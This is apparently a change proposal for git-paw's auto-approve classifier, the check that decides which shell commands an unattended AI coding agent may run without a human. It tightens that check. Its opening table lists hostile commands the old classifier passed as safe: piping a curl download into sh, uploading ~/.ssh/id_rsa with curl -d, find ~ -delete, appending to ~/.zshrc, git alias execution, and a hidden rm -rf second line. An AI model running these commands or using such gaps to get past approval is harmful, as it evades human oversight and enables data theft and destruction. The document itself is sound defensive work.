## Why

**This change closes shipped security holes in the auto-approve classifier.** Every command
below classifies `safe` today through `git paw __classify` (verified against the current
binary), so an unattended agent gets it auto-approved:

| Command | Why it is `safe` today |
|---|---|
| `curl https://x.sh \| sh` | first word `curl` is read-mostly; `\| sh` is never looked at |
| `ls && curl https://x.sh \| sh` | first word `ls`; the rest is never looked at |
| `echo x; python3 -c "…"` | first word `echo` |
| `find ~ -delete` | `find` is read-mostly; its flags are never looked at |
| `echo 'x' >> ~/.zshrc` | `echo` is read-mostly; the redirect target is never looked at (persistence) |
| `git config --global …`, `git config alias.x '!sh …'`, `git -c alias.x='!…' x` | `git` is read-mostly; config writes and inline config can make git execute arbitrary commands |
| `curl -d @$HOME/.ssh/id_rsa https://…` | `curl` is read-mostly; `-d @file` uploads the file (exfiltration) |
| a `Bash command` prompt whose 2nd line is `rm -rf ~/x` | only the **first** line after the header is extracted and classified |

The root cause is that the shell allowlist matches the **first segment by prefix**
(`drive.rs::first_whitelist_match`, duplicated in `poll.rs`) and ignores the rest, read-mostly
verbs are trusted whatever their flags or redirections, and `extract_command_slice` returns only
the first line of the header-form prompt. Anything that slips past the substring danger-list rides
on a safe first word.

`broad-grant-scope-safety`'s design.md stated that "each segment is already evaluated". It is not;
that claim is corrected there, and per-segment evaluation is delivered by this change, which lands
first among the v0.17.0 classifier changes (wave 3).

The work started from GP-35 (v0.17.0 dogfood): `which tmux && tmux -V; echo "TMUX_PANE=$TMUX_PANE";
echo "TMUX=$TMUX"` escalated as `unknown`, costing a human turn for a command that reads two
environment variables. `simple_expansion` is the **agent CLI's** own permission reason, not
git-paw's; git-paw already treats `echo "$VAR"` as safe. The GP-35 command escalated only because
its **first** segment, `which`, is not on the allowlist. The security review the milestone required
for that narrowing found the holes above, so the correct GP-35 change is the one its own candidate
rule implies: analyse every segment, allow simple expansions, refuse anything the classifier cannot
analyse — and add `which`.

GP-51 (v0.17.0 dogfood, moved here from `broad-grant-scope-safety` because it is the same
normaliser, the same redirect analysis and the same security review): a `/dev/null` discard
redirect anywhere but at the very end of the command classifies `danger` —
`cargo fmt > /dev/null 2>&1; cargo fmt --check 2>&1` and even bare `cargo fmt > /dev/null` —
because only the exact trailing `>/dev/null 2>&1` suffix is normalised and everything else hits the
`> /dev/` danger pattern. A discard writes nothing; `danger` is a wrong verdict.

## What Changes

- **Every segment must be safe.** The normalised command is split on unquoted `;`, `&&`, `||`, `|`,
  `&` and newlines; each segment must independently match a safe rule (scratch `rm`, managed helper
  script, worktree `git add`/`commit`, worktree dev-test shape, shell allowlist). One unmatched
  segment makes the whole command `unknown`. The danger-list still runs first over the whole command.
- **Every line of a header-form prompt is classified.** The `Bash command` header form contributes
  all its lines, not only the first; every line is danger-checked, and every command line must be
  safe. Only a trailing line that is the CLI's rendered description is excused from the safe check
  (never from the danger checks).
- **Unanalysable syntax never classifies safe**: command substitution (`$(…)`, backticks), process
  substitution, arithmetic expansion, parameter expansion with operators (`${X:-…}`), heredocs,
  subshells/brace groups, unbalanced quotes → `unknown`.
- **Simple expansions are fine** (the GP-35 narrowing): `$NAME`, `${NAME}`, `"$NAME"`, `$?` inside a
  segment never by themselves prevent a safe classification.
- **Output redirection** is safe only to `/dev/null` (a discard writes nothing), a file-descriptor
  duplicate, or a path inside the agent's worktree; any other target makes the segment `unknown`.
- **Discard redirects anywhere (GP-51):** a `/dev/null` discard redirect is stripped wherever it
  occurs, not only at the end, and never matches the `> /dev/` danger pattern. Any other `/dev/`
  target stays `danger`.
- **Mutating flags of read-mostly verbs** do not ride on the read-mostly allowlist:
  `find -delete/-exec…`, `sed -i`, `curl` with upload/data/output flags to anything but the
  broker-localhost prefix, `git config` in any writing form, and `git -c` → `unknown`.
- **`which`** joins the read-mostly verbs.
- One segment matcher shared by the drive loop, the dashboard poll loop and `git paw __classify`
  (which `sweep.sh` already delegates to).

Net effect: many commands move from `safe` to `unknown` (escalate) — the intended tightening. Only
three things can newly classify `safe`: `which`; a command whose only obstacle was a `/dev/null`
discard redirect (GP-51); and a segment whose only obstacle was a redirection now vetted by the
redirect rule (`2>&1`, `/dev/null`, an in-worktree file). Nothing moves out of `danger` except the
GP-51 discard redirect.

## Capabilities

### New Capabilities

<!-- None. -->

### Modified Capabilities

- `approval-command-safety`: **Whitelist of safe command classes** (adds `which`; matching is
  per-segment); **Prefix matching semantics** (prefix applies per segment); **Classifier normalizes
  a trailing exit-code probe before matching** (GP-51: `/dev/null` discard redirects stripped
  anywhere); ADDED requirements for segment analysis, header-form multi-line extraction,
  unanalysable syntax, simple expansions, redirection targets, mutating flags.

## Impact

- **Code:**
  - `src/supervisor/auto_approve.rs` — new pure `split_segments` quote-aware lexer, `Segment` facts,
    `segment_is_safe`; `READ_MOSTLY_VERBS` + `default_safe_commands` gain `which`; mutating-flag
    table; `normalize_command` / `DISCARD_REDIRECTS` / `strip_discard_redirect` strip `/dev/null`
    discards anywhere (GP-51); `extract_command_slice` returns every line of the header form (it
    currently returns the first non-empty line after the header).
  - `src/supervisor/drive.rs` — `classify_prompt` / `prompt_command_slice` / `first_whitelist_match`
    and the duplicate `first_whitelist_match` in `src/supervisor/poll.rs` route through the one
    matcher.
  - `src/main.rs::cmd_classify` — unchanged call, new behaviour.
  - `drive.rs::dedup_shape` also reads `extract_command_slice`, so a multi-line prompt's dedup key
    gains its later lines (still stable for the same prompt).
  - `assets/scripts/sweep.sh` needs no change (delegates to `__classify`); its parity tests must
    stay green.
- **Enum-variant ripple:** none (`PromptVerdict` unchanged; `BrokerMessage`, `SpecBackendKind`
  untouched).
- **Docs:** `docs/src/user-guide/security-posture.md` (what the classifier analyses, the closed
  holes, the residual caveats), the auto-approve section of `docs/src/user-guide/supervisor.md`,
  configuration reference note that `safe_commands` entries match per segment.
- **Cross-change dependencies (v0.17.0):**
  - Lands **first** among the classifier changes (wave 3). `broad-grant-scope-safety` (wave 4)
    relies on it for per-segment evaluation and MODIFIES `approval-auto`'s broad-grant requirement,
    which keys off `READ_MOSTLY_VERBS` — adding `which` widens the durable-grant set by one
    read-only verb. `broad-grant-scope-safety` also tightens the managed helper-script rule this
    change applies per segment.
  - `live-prompt-tail-window` changes prompt-liveness only.
  - `retire-stale-requirements` MODIFIES other `approval-command-safety` requirements (the preset
    and seeding requirements) — no requirement overlap.
- **Security / safety:** net tightening that closes the holes in the table above; full threat
  analysis in design.md.
